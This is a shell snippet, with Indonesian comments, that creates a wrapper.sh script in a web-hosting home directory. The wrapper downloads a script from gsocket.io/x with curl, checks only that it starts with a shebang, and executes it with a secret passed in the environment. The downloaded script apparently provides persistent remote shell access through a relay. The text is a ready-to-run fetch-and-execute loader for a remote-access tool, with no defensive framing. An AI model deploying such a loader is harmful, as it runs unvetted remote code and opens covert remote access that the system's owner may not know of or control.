cat > /home/u720333187/script/wrapper.sh <<'WEOF'
#!/usr/bin/env bash
# wrapper.sh (ditempatkan di /home/u720333187/script/)
# Behavior:
# - cek SECRET
# - jika gsocket_x.sh belum ada di folder yang sama, download + validasi
# - jalankan gsocket_x.sh dengan APP_SECRET dari SECRET

# directory this script berada
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
OUT="$DIR/gsocket_x.sh"
GS_URL="https://gsocket.io/x"
TRIES=8
SLEEP=2

if [[ -z "$SECRET" ]]; then
  echo "$(date +'%F %T') ERROR: SECRET unset" >&2
  exit 1
fi

download_and_check() {
  local try=1
  while (( try <= TRIES )); do
    echo "$(date +'%F %T') Attempt $try: downloading $GS_URL ..."
    tmpf="$(mktemp)"
    http_code="$(curl -sS -w "%{http_code}" -o "$tmpf" "$GS_URL" || echo "000")"
    if [[ "$http_code" == "200" ]] && head -n1 "$tmpf" | grep -qE '^#!'; then
      mv -f "$tmpf" "$OUT"
      chmod 700 "$OUT"
      echo "$(date +'%F %T') OK: downloaded valid script to $OUT (http=$http_code)"
      return 0
    fi
    echo "$(date +'%F %T') Failed (http=$http_code or no shebang). Retrying in $SLEEP s..."
    rm -f "$tmpf"
    try=$((try+1))
    sleep "$SLEEP"
  done
  return 1
}

if [[ ! -f "$OUT" ]]; then
  echo "$(date +'%F %T') $OUT not found — attempting to download..."
  if ! download_and_check; then
    echo "$(date +'%F %T') ERROR: Could not download valid script after $TRIES tries" >&2
    exit 2
  fi
else
  chmod 700 "$OUT" 2>/dev/null || true
  echo "$(date +'%F %T') Found existing $OUT (size=$(stat -c%s "$OUT") bytes)"
  if ! head -n1 "$OUT" | grep -qE '^#!'; then
    echo "$(date +'%F %T') WARNING: $OUT does not start with shebang; attempting re-download..."
    if ! download_and_check; then
      echo "$(date +'%F %T') ERROR: re-download failed" >&2
      exit 3
    fi
  fi
fi

export APP_SECRET="$SECRET"
echo "$(date +'%F %T') Executing $OUT ..."
exec bash "$OUT"
echo "$(date +'%F %T') ERROR: exec returned" >&2
exit 4
WEOF

# beri izin executable
chmod +x /home/u720333187/script/wrapper.sh
